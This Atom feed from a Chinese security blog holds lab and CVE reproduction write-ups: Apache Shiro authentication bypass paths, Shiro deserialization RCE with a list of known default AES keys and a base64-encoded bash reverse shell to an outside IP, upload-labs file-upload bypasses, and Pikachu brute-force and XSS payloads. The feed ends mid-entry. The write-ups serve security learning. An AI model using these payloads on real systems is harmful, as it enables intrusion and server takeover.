<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lluna&#39;s Pure land.</title>
  
  <subtitle>What is life like when singing to wine?</subtitle>
  <link href="https://lunamoore.github.io/atom.xml" rel="self"/>
  
  <link href="https://lunamoore.github.io/"/>
  <updated>2021-06-06T13:39:25.577Z</updated>
  <id>https://lunamoore.github.io/</id>
  
  <author>
    <name>Lluna</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2020-1957</title>
    <link href="https://lunamoore.github.io/2021/06/06/CVE-2020-1957/"/>
    <id>https://lunamoore.github.io/2021/06/06/CVE-2020-1957/</id>
    <published>2021-06-06T13:20:02.000Z</published>
    <updated>2021-06-06T13:39:25.577Z</updated>
    
    <content type="html"><![CDATA[<h2 id="（CVE-2020-1957）Apache-Shiro-身份认证绕过漏洞"><a href="#（CVE-2020-1957）Apache-Shiro-身份认证绕过漏洞" class="headerlink" title="（CVE-2020-1957）Apache Shiro 身份认证绕过漏洞"></a>（CVE-2020-1957）Apache Shiro 身份认证绕过漏洞</h2><hr><h2 id="0x01-漏洞简述"><a href="#0x01-漏洞简述" class="headerlink" title="0x01.漏洞简述"></a>0x01.漏洞简述</h2><p>Apache Shiro 1.5.2之前版本中存在安全漏洞。攻击者可借助特制的请求利用该漏洞绕过身份验证。</p><a id="more"></a><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02.影响版本"></a>0x02.影响版本</h2><p>Apache Shiro &lt; v1.5.2</p><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03.漏洞分析"></a>0x03.漏洞分析</h2><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzgwNTQ5L2FydGljbGUvZGV0YWlscy8xMDcwMzE3NDY/b3BzX3JlcXVlc3RfbWlzYz0lMjU3QiUyNTIycmVxdWVzdCUyNTVGaWQlMjUyMiUyNTNBJTI1MjIxNjIyOTg1OTkzMTY3ODAyNTUyNzgxNDclMjUyMiUyNTJDJTI1MjJzY20lMjUyMiUyNTNBJTI1MjIyMDE0MDcxMy4xMzAxMDIzMzQucGMlMjU1RmJsb2cuJTI1MjIlMjU3RCZyZXF1ZXN0X2lkPTE2MjI5ODU5OTMxNjc4MDI1NTI3ODE0NyZiaXpfaWQ9MCZ1dG1fbWVkaXVtPWRpc3RyaWJ1dGUucGNfc2VhcmNoX3Jlc3VsdC5ub25lLXRhc2stYmxvZy0yfmJsb2d+Zmlyc3RfcmFua192Mn5yYW5rX3YyOS0zLTEwNzAzMTc0Ni5ub25lY2FzZSZ1dG1fdGVybT1DVkUtMjAyMC0xOTU3JnNwbT0xMDE4LjIyMjYuMzAwMS40NDUw">轮子轮子<i class="fa fa-external-link-alt"></i></span></p><h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03.漏洞复现"></a>0x03.漏洞复现</h2><p><strong>环境搭建</strong></p><p><span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLw==">vulhub<i class="fa fa-external-link-alt"></i></span></p><p>admin认证绕过</p><p>直接访问/admin，跳转到登入页面</p><img src="/2021/06/06/CVE-2020-1957/CVE-2020-1957_08.png" class><p>绕过：/demo/..;/admin/  或   /demo;/../admin/</p><img src="/2021/06/06/CVE-2020-1957/CVE-2020-1957_09.png" class><img src="/2021/06/06/CVE-2020-1957/CVE-2020-1957_10.png" class>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;（CVE-2020-1957）Apache-Shiro-身份认证绕过漏洞&quot;&gt;&lt;a href=&quot;#（CVE-2020-1957）Apache-Shiro-身份认证绕过漏洞&quot; class=&quot;headerlink&quot; title=&quot;（CVE-2020-1957）Apache Shiro 身份认证绕过漏洞&quot;&gt;&lt;/a&gt;（CVE-2020-1957）Apache Shiro 身份认证绕过漏洞&lt;/h2&gt;&lt;hr&gt;
&lt;h2 id=&quot;0x01-漏洞简述&quot;&gt;&lt;a href=&quot;#0x01-漏洞简述&quot; class=&quot;headerlink&quot; title=&quot;0x01.漏洞简述&quot;&gt;&lt;/a&gt;0x01.漏洞简述&lt;/h2&gt;&lt;p&gt;Apache Shiro 1.5.2之前版本中存在安全漏洞。攻击者可借助特制的请求利用该漏洞绕过身份验证。&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="CVE" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE/"/>
    
    <category term="Shiro" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE/Shiro/"/>
    
    
    <category term="CVE" scheme="https://lunamoore.github.io/tags/CVE/"/>
    
    <category term="调教" scheme="https://lunamoore.github.io/tags/%E8%B0%83%E6%95%99/"/>
    
    <category term="Shiro" scheme="https://lunamoore.github.io/tags/Shiro/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2016-4437复现</title>
    <link href="https://lunamoore.github.io/2021/06/06/CVE-2016-4437/"/>
    <id>https://lunamoore.github.io/2021/06/06/CVE-2016-4437/</id>
    <published>2021-06-06T12:54:08.000Z</published>
    <updated>2021-06-06T13:11:13.192Z</updated>
    
    <content type="html"><![CDATA[<h2 id="（CVE-2016-4437）Apache-Shiro-反序列化漏洞"><a href="#（CVE-2016-4437）Apache-Shiro-反序列化漏洞" class="headerlink" title="（CVE-2016-4437）Apache Shiro 反序列化漏洞"></a>（CVE-2016-4437）Apache Shiro 反序列化漏洞</h2><hr><h2 id="0x01-漏洞简述"><a href="#0x01-漏洞简述" class="headerlink" title="0x01.漏洞简述"></a>0x01.漏洞简述</h2><p>Apache shiro默认使用了<code>CookieRememberMeManager</code>，其处理cookie的流程是：得到<code>rememberMe的cookie值</code>–&gt;<code>Base64解码</code>–&gt;<code>AES解密</code>–&gt;<code>反序列化</code>。<br>然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。</p><a id="more"></a><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02.影响版本"></a>0x02.影响版本</h2><p>Apache Shiro &lt;= v1.2.4</p><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03.漏洞分析"></a>0x03.漏洞分析</h2><p><span class="exturl" data-url="aHR0cHM6Ly9zYXVjZXItbWFuLmNvbS9pbmZvcm1hdGlvbl9zZWN1cml0eS8zOTYuaHRtbA==">不造轮子了。。。<i class="fa fa-external-link-alt"></i></span></p><h2 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04.漏洞复现"></a>0x04.漏洞复现</h2><p> 网络上收集到的key</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</span><br><span class="line">3qDVdLawoIr1xFd6ietnwg&#x3D;&#x3D;</span><br><span class="line">YI1+nBV&#x2F;&#x2F;m7ELrIyDHm6DQ&#x3D;&#x3D;</span><br><span class="line">6Zm+6I2j5Y+R5aS+5ZOlAA&#x3D;&#x3D;</span><br><span class="line">2A2V+RFLUs+eTA3Kpr+dag&#x3D;&#x3D;</span><br><span class="line">6ZmI6I2j3Y+R1aSn5BOlAA&#x3D;&#x3D;</span><br><span class="line">SkZpbmFsQmxhZGUAAAAAAA&#x3D;&#x3D;</span><br><span class="line">2cVtiE83c4lIrELJwKGJUw&#x3D;&#x3D;</span><br><span class="line">fsHspZw&#x2F;92PrS3XrPW+vxw&#x3D;&#x3D;</span><br><span class="line">XTx6CKLo&#x2F;SdSgub+OPHSrw&#x3D;&#x3D;</span><br><span class="line">sHdIjUN6tzhl8xZMG3ULCQ&#x3D;&#x3D;</span><br><span class="line">O4pdf+7e+mZe8NyxMTPJmQ&#x3D;&#x3D;</span><br><span class="line">HWrBltGvEZc14h9VpMvZWw&#x3D;&#x3D;</span><br><span class="line">rPNqM6uKFCyaL10AK51UkQ&#x3D;&#x3D;</span><br><span class="line">Y1JxNSPXVwMkyvES&#x2F;kJGeQ&#x3D;&#x3D;</span><br><span class="line">lT2UvDUmQwewm6mMoiw4Ig&#x3D;&#x3D;</span><br><span class="line">MPdCMZ9urzEA50JDlDYYDg&#x3D;&#x3D;</span><br><span class="line">xVmmoltfpb8tTceuT5R7Bw&#x3D;&#x3D;</span><br><span class="line">c+3hFGPjbgzGdrC+MHgoRQ&#x3D;&#x3D;</span><br><span class="line">ClLk69oNcA3m+s0jIMIkpg&#x3D;&#x3D;</span><br><span class="line">Bf7MfkNR0axGGptozrebag&#x3D;&#x3D;</span><br><span class="line">1tC&#x2F;xrDYs8ey+sa3emtiYw&#x3D;&#x3D;</span><br><span class="line">ZmFsYWRvLnh5ei5zaGlybw&#x3D;&#x3D;</span><br><span class="line">cGhyYWNrY3RmREUhfiMkZA&#x3D;&#x3D;</span><br><span class="line">IduElDUpDDXE677ZkhhKnQ&#x3D;&#x3D;</span><br><span class="line">yeAAo1E8BOeAYfBlm4NG9Q&#x3D;&#x3D;</span><br><span class="line">2itfW92XazYRi5ltW0M2yA&#x3D;&#x3D;</span><br><span class="line">XgGkgqGqYrix9lI6vxcrRw&#x3D;&#x3D;</span><br><span class="line">ertVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">5AvVhmFLUS0ATA4Kprsdag&#x3D;&#x3D;</span><br><span class="line">s0KTA3mFLUprK4AvVhsdag&#x3D;&#x3D;</span><br><span class="line">hBlzKg78ajaZuTE0VLzDDg&#x3D;&#x3D;</span><br><span class="line">9FvVhtFLUs0KnA3Kprsdyg&#x3D;&#x3D;</span><br><span class="line">d2ViUmVtZW1iZXJNZUtleQ&#x3D;&#x3D;</span><br><span class="line">yNeUgSzL&#x2F;CfiWw1GALg6Ag&#x3D;&#x3D;</span><br><span class="line">NGk&#x2F;3cQ6F5&#x2F;UNPRh8LpMIg&#x3D;&#x3D;</span><br><span class="line">4BvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">MzVeSkYyWTI2OFVLZjRzZg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p><strong>poc</strong></p><p>使用shiro_tool.jar反弹shell</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar shiro_tool.jar http:<span class="comment">//your_ip:8080</span></span><br></pre></td></tr></table></figure><img src="/2021/06/06/CVE-2016-4437/CVE-2016-4437_01.png" class><p>使用1和10都可以，反弹shell需要编码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC84MS43MC4xOTUuMTU5LzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p>nc监听反弹shell</p><img src="/2021/06/06/CVE-2016-4437/CVE-2016-4437_02.png" class><p>抓包分析，看到http请求头Cookie字段为 rememberMe=**，响应头存在Set-Cookie:rememberMe=deleteMe</p><img src="/2021/06/06/CVE-2016-4437/CVE-2016-4437_03.png" class><h2 id="0x05-官方修复"><a href="#0x05-官方修复" class="headerlink" title="0x05.官方修复"></a>0x05.官方修复</h2><ul><li>删除代码里的默认密钥</li><li>默认配置里注释了默认密钥</li><li>如果不配置密钥，每次会重新随机一个密钥</li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;（CVE-2016-4437）Apache-Shiro-反序列化漏洞&quot;&gt;&lt;a href=&quot;#（CVE-2016-4437）Apache-Shiro-反序列化漏洞&quot; class=&quot;headerlink&quot; title=&quot;（CVE-2016-4437）Apache Shiro 反序列化漏洞&quot;&gt;&lt;/a&gt;（CVE-2016-4437）Apache Shiro 反序列化漏洞&lt;/h2&gt;&lt;hr&gt;
&lt;h2 id=&quot;0x01-漏洞简述&quot;&gt;&lt;a href=&quot;#0x01-漏洞简述&quot; class=&quot;headerlink&quot; title=&quot;0x01.漏洞简述&quot;&gt;&lt;/a&gt;0x01.漏洞简述&lt;/h2&gt;&lt;p&gt;Apache shiro默认使用了&lt;code&gt;CookieRememberMeManager&lt;/code&gt;，其处理cookie的流程是：得到&lt;code&gt;rememberMe的cookie值&lt;/code&gt;–&amp;gt;&lt;code&gt;Base64解码&lt;/code&gt;–&amp;gt;&lt;code&gt;AES解密&lt;/code&gt;–&amp;gt;&lt;code&gt;反序列化&lt;/code&gt;。&lt;br&gt;然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="CVE" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE/"/>
    
    <category term="Shiro" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE/Shiro/"/>
    
    
    <category term="CVE" scheme="https://lunamoore.github.io/tags/CVE/"/>
    
    <category term="调教" scheme="https://lunamoore.github.io/tags/%E8%B0%83%E6%95%99/"/>
    
    <category term="Shiro" scheme="https://lunamoore.github.io/tags/Shiro/"/>
    
  </entry>
  
  <entry>
    <title>upload_labs</title>
    <link href="https://lunamoore.github.io/2021/05/03/upload-labs/"/>
    <id>https://lunamoore.github.io/2021/05/03/upload-labs/</id>
    <published>2021-05-03T11:21:45.000Z</published>
    <updated>2021-05-03T11:40:24.986Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Pass01-基于前端js验证"><a href="#Pass01-基于前端js验证" class="headerlink" title="Pass01.基于前端js验证"></a>Pass01.基于前端js验证</h2><p><code>上传图片抓包改后缀</code></p><h2 id="Pass02-检测MIME类型"><a href="#Pass02-检测MIME类型" class="headerlink" title="Pass02.检测MIME类型"></a>Pass02.检测MIME类型</h2><p><code>修改MIME为image/jpeg</code></p><a id="more"></a><h2 id="Pass03-黑名单-文件后缀绕过"><a href="#Pass03-黑名单-文件后缀绕过" class="headerlink" title="Pass03.黑名单 文件后缀绕过"></a>Pass03.黑名单 文件后缀绕过</h2><p><code>首先修改apache2配置文件</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apache2/mods-available/mime.conf</span><br><span class="line">找到AddType application，增加一行，重启服务</span><br><span class="line">AddType application/x-httpd-php .php .phtml .phps .php5 .pht .php3</span><br></pre></td></tr></table></figure><p><code>上传.php5文件</code></p><img src="/2021/05/03/upload-labs/image-20210501125955299.png" class><h2 id="Pass04-黑名单-htaccess绕过"><a href="#Pass04-黑名单-htaccess绕过" class="headerlink" title="Pass04.黑名单 .htaccess绕过"></a>Pass04.黑名单 .htaccess绕过</h2><p><code>先上传.htaccess文件，内容如下</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">此条伪静态规则为将demo文件解析成php文件执行</span><br><span class="line">&lt;FilesMatch &quot;demo&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line">也可以是以下，将所有文件解析为php</span><br><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p><code>本次使用第二条，将所有文件解析为php</code></p><img src="/2021/05/03/upload-labs/image-20210501130707455.png" class><h2 id="Pass05-黑名单-大小写绕过"><a href="#Pass05-黑名单-大小写绕过" class="headerlink" title="Pass05.黑名单 大小写绕过"></a>Pass05.黑名单 大小写绕过</h2><p><code>禁止上传.htaccess</code></p><img src="/2021/05/03/upload-labs/image-20210501131324884.png" class><h2 id="Pass06-黑名单-空格绕过"><a href="#Pass06-黑名单-空格绕过" class="headerlink" title="Pass06.黑名单 空格绕过"></a>Pass06.黑名单 空格绕过</h2><p><code>禁止上传.htaccess</code></p><p><code>在文件后加一个空格即可(需要在windows环境下，widows自动去空格和点)</code></p><h2 id="Pass07-黑名单-点绕过"><a href="#Pass07-黑名单-点绕过" class="headerlink" title="Pass07.黑名单 点绕过"></a>Pass07.黑名单 点绕过</h2><p><code>禁止上传.htaccess</code></p><p><code>在文件后加一个点即可(最好在windows环境下)</code></p><img src="/2021/05/03/upload-labs/image-20210501134215848.png" class><h2 id="Pass08-黑名单-DATA绕过"><a href="#Pass08-黑名单-DATA绕过" class="headerlink" title="Pass08.黑名单 ::$DATA绕过"></a>Pass08.黑名单 ::$DATA绕过</h2><p><code>文件后缀添加::$DATA绕过(windows环境)</code></p><h2 id="Pass09-黑名单-点空点绕过"><a href="#Pass09-黑名单-点空点绕过" class="headerlink" title="Pass09.黑名单 点空点绕过"></a>Pass09.黑名单 点空点绕过</h2><p><code>会删除文件后的点，在文件后添加. .进行绕过(window环境)</code></p><h2 id="Pass10-黑名单-双写后缀绕过"><a href="#Pass10-黑名单-双写后缀绕过" class="headerlink" title="Pass10.黑名单 双写后缀绕过"></a>Pass10.黑名单 双写后缀绕过</h2><p><code>从前匹配php进行删除，双写绕过</code></p><h2 id="Pass11-白名单-00绕过"><a href="#Pass11-白名单-00绕过" class="headerlink" title="Pass11.白名单 %00绕过"></a>Pass11.白名单 %00绕过</h2><p><code>get传参路径可控</code></p><img src="/2021/05/03/upload-labs/image-20210501173709601.png" class><p><code>PHP版本小于5.3.4 关闭GPC</code></p><img src="/2021/05/03/upload-labs/image-20210501180802917.png" class><h2 id="Pass12-白名单-0x00绕过"><a href="#Pass12-白名单-0x00绕过" class="headerlink" title="Pass12.白名单 0x00绕过"></a>Pass12.白名单 0x00绕过</h2><blockquote><p>shell_get.php%00</p></blockquote><p><code>同上，由于post传参所以将%00进行url编码</code></p><img src="/2021/05/03/upload-labs/image-20210501182130172.png" class><h2 id="Pass13-检查图标内容开头2个字节-图片马绕过"><a href="#Pass13-检查图标内容开头2个字节-图片马绕过" class="headerlink" title="Pass13.检查图标内容开头2个字节 图片马绕过"></a>Pass13.检查图标内容开头2个字节 图片马绕过</h2><img src="/2021/05/03/upload-labs/image-20210501184645711.png" class><h2 id="Pass14-getimagesize-检查是否为图片文件-图片马绕过"><a href="#Pass14-getimagesize-检查是否为图片文件-图片马绕过" class="headerlink" title="Pass14.getimagesize()检查是否为图片文件 图片马绕过"></a>Pass14.getimagesize()检查是否为图片文件 图片马绕过</h2><p><code>同上</code></p><h2 id="Pass15-exif-imagetype-检查是否为图片文件-图片马绕过"><a href="#Pass15-exif-imagetype-检查是否为图片文件-图片马绕过" class="headerlink" title="Pass15.exif_imagetype()检查是否为图片文件 图片马绕过"></a>Pass15.exif_imagetype()检查是否为图片文件 图片马绕过</h2><p><code>同上</code></p><h2 id="Pass16-图片二次渲染"><a href="#Pass16-图片二次渲染" class="headerlink" title="Pass16.图片二次渲染"></a>Pass16.图片二次渲染</h2><p><code>将二次渲染后文件未变化的部分添加一句话，再次上传，再包含，蚁剑连接。本案例使用gif，图片不知道为什么上传不上去。</code> </p><img src="/2021/05/03/upload-labs/image-20210503180938026.png" class><h2 id="Pass17-条件竞争"><a href="#Pass17-条件竞争" class="headerlink" title="Pass17.条件竞争"></a>Pass17.条件竞争</h2><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZnVqaWVhY2UuY29tL3BlbmV0cmF0aW9uLXRlc3QvdXBsb2FkLWxhYnMtcGFzcy0xNy5odG1s">大佬的文章<i class="fa fa-external-link-alt"></i></span></p><p><code>先move再判断，符合白名单就重命名，不符合就unlink。</code></p><p><code>但是我图片马直接就可以了，为了学习新知识，也用大佬的方法做了一遍</code></p><h2 id="Pass18-条件竞争"><a href="#Pass18-条件竞争" class="headerlink" title="Pass18.条件竞争"></a>Pass18.条件竞争</h2><p><code>与pass17类似</code></p><h2 id="Pass19-绕过"><a href="#Pass19-绕过" class="headerlink" title="Pass19./.绕过"></a>Pass19./.绕过</h2><p><code>move_uploaded_file会忽略掉文件末尾的 /.</code></p><img src="/2021/05/03/upload-labs/image-20210503190859889.png" class><img src="/2021/05/03/upload-labs/image-20210503191007583.png" class><h2 id="Pass20-代码审计-数组绕过"><a href="#Pass20-代码审计-数组绕过" class="headerlink" title="Pass20.代码审计 数组绕过"></a>Pass20.代码审计 数组绕过</h2><p><code>直接参考大佬的文章</code></p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTQwMjk3OTUvYXJ0aWNsZS9kZXRhaWxzLzEwMjkxNzE5OQ==">地址<i class="fa fa-external-link-alt"></i></span></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Pass01-基于前端js验证&quot;&gt;&lt;a href=&quot;#Pass01-基于前端js验证&quot; class=&quot;headerlink&quot; title=&quot;Pass01.基于前端js验证&quot;&gt;&lt;/a&gt;Pass01.基于前端js验证&lt;/h2&gt;&lt;p&gt;&lt;code&gt;上传图片抓包改后缀&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&quot;Pass02-检测MIME类型&quot;&gt;&lt;a href=&quot;#Pass02-检测MIME类型&quot; class=&quot;headerlink&quot; title=&quot;Pass02.检测MIME类型&quot;&gt;&lt;/a&gt;Pass02.检测MIME类型&lt;/h2&gt;&lt;p&gt;&lt;code&gt;修改MIME为image/jpeg&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web靶场" scheme="https://lunamoore.github.io/categories/Web%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="靶机" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>Pikachu靶机</title>
    <link href="https://lunamoore.github.io/2021/04/28/Pikachu/"/>
    <id>https://lunamoore.github.io/2021/04/28/Pikachu/</id>
    <published>2021-04-28T06:13:40.000Z</published>
    <updated>2021-05-03T11:35:43.332Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-暴力破解"><a href="#0x01-暴力破解" class="headerlink" title="0x01.暴力破解"></a>0x01.暴力破解</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Burte Force（暴力破解）概述</span><br><span class="line">“暴力破解”是一攻击手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 </span><br><span class="line">其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 </span><br><span class="line">为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。</span><br><span class="line">理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 </span><br><span class="line">我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。 </span><br><span class="line">这里的认证安全策略, 包括：</span><br><span class="line">1.是否要求用户设置复杂的密码；</span><br><span class="line">2.是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；</span><br><span class="line">3.是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；</span><br><span class="line">4.是否采用了双因素认证；</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="01-基于表单的暴力破解"><a href="#01-基于表单的暴力破解" class="headerlink" title="01.基于表单的暴力破解"></a>01.基于表单的暴力破解</h3><p><code>没有验证，直接爆破</code></p><img src="/2021/04/28/Pikachu/image-20210426093055435.png" class><img src="/2021/04/28/Pikachu/image-20210426093144110.png" class><img src="/2021/04/28/Pikachu/image-20210426093156702.png" class><img src="/2021/04/28/Pikachu/image-20210426093250664.png" class><h3 id="02-验证码绕过-on-server"><a href="#02-验证码绕过-on-server" class="headerlink" title="02.验证码绕过(on server)"></a>02.验证码绕过(on server)</h3><p><code>当验证码输入正确、为空和输入错误会是以下3种情况：</code></p><img src="/2021/04/28/Pikachu/image-20210426093447946.png" class><img src="/2021/04/28/Pikachu/image-20210426093726275.png" class><img src="/2021/04/28/Pikachu/image-20210426093751155.png" class><p><code>绕过的思路就是观察验证码会不是认证一次就刷新</code></p><p><code>这里更改用户名密码，不更改验证码，返回的结果均为账户密码错误，可以得出验证码不是认证一次刷新一次</code></p><img src="/2021/04/28/Pikachu/image-20210426094235586.png" class><img src="/2021/04/28/Pikachu/image-20210426094442761.png" class><p><code>接下来按照上一题进行爆破即可</code></p><h3 id="03-验证码绕过-on-client"><a href="#03-验证码绕过-on-client" class="headerlink" title="03.验证码绕过(on client)"></a>03.验证码绕过(on client)</h3><p><code>前端的验证直接bp抓包即可，同上</code></p><img src="/2021/04/28/Pikachu/image-20210426095048409.png" class><h2 id="0x02-XSS"><a href="#0x02-XSS" class="headerlink" title="0x02.XSS"></a>0x02.XSS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">XSS（跨站脚本）概述</span><br><span class="line">Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写&quot;CSS&quot;冲突，故又称XSS。</span><br><span class="line">一般XSS可以分为如下几种常见类型：</span><br><span class="line">    1.反射性XSS;</span><br><span class="line">    2.存储型XSS;</span><br><span class="line">    3.DOM型XSS;</span><br><span class="line"></span><br><span class="line">XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。</span><br><span class="line">XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。</span><br><span class="line">形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。</span><br><span class="line">因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:</span><br><span class="line">  输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;</span><br><span class="line">  输出转义：根据输出点的位置对输出到前端的内容进行适当转义;</span><br></pre></td></tr></table></figure><h3 id="01-反射型xss-get"><a href="#01-反射型xss-get" class="headerlink" title="01.反射型xss(get)"></a>01.反射型xss(get)</h3><p><code>没有过滤直接打</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="regexp">/xss/</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="02-反射型xss-post"><a href="#02-反射型xss-post" class="headerlink" title="02.反射型xss(post)"></a>02.反射型xss(post)</h3><p><code>根据提示登入，直接打</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="03-存储型xss"><a href="#03-存储型xss" class="headerlink" title="03.存储型xss"></a>03.存储型xss</h3><p><code>没有过滤直接打</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="04-DOM型xss"><a href="#04-DOM型xss" class="headerlink" title="04.DOM型xss"></a>04.DOM型xss</h3><p><code>测试发现输入的内容在&lt;a&gt;标签中，只有闭合a标签才可以插入任意代码</code></p><img src="/2021/04/28/Pikachu/image-20210426102947841.png" class><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; onmouseover=&quot;alert(/xss/)&quot;&gt;</span></span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210426104744355.png" class><h3 id="05-DOM型xss-x"><a href="#05-DOM型xss-x" class="headerlink" title="05.DOM型xss-x"></a>05.DOM型xss-x</h3><p><code>同上</code></p><img src="/2021/04/28/Pikachu/image-20210426125421138.png" class><h3 